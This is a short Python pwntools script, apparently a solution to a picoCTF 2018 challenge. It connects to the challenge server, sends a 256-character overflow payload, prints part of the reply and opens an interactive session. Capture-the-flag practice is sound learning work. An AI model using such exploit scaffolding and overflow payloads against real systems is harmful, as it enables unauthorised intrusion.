from pwn import *

sh = remote('2018shell2.picoctf.com', 57659)

payload = 'a'*256

sh.sendlineafter('?\n', payload)

print sh.recvuntil('\n').split(',')[1]

sh.interactive()
